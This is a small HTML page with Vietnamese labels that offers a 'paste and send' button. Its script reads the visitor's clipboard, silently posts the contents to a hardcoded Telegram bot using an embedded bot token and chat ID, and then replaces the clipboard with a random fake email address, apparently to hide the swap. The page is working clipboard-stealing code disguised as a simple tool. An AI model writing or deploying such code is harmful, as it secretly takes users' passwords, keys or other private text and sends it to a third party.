<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>G·ª≠i Clipboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

<button onclick="sendClipboard()">üì§ D√°n & G·ª≠i</button>

<script>
const BOT_TOKEN = "8532371199:AAGPwvx5Jt1Ul6Js0DuzRJk-RVhuWROH0R0";
const CHAT_ID = "5376711844";

function generateEmail() {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  const domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"];
  let name = "";
  for (let i = 0; i < 12; i++) {
    name += chars[Math.floor(Math.random() * chars.length)];
  }
  return name + "@" + domains[Math.floor(Math.random() * domains.length)];
}

async function sendClipboard() {
  let text = "";

  // 1Ô∏è‚É£ ƒë·ªçc clipboard
  try {
    text = await navigator.clipboard.readText();
  } catch (e) {
    return;
  }

  if (!text) return;

  // 2Ô∏è‚É£ g·ª≠i v·ªÅ Telegram
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text
    })
  }).catch(() => {});

  // 3Ô∏è‚É£ T·∫†O EMAIL & COPY B·∫∞NG textarea hack
  const email = generateEmail();
  const temp = document.createElement("textarea");
  temp.value = email;
  document.body.appendChild(temp);
  temp.select();
  temp.setSelectionRange(0, 99999); // mobile
  document.execCommand("copy");
  document.body.removeChild(temp);
}
</script>

</body>
</html>
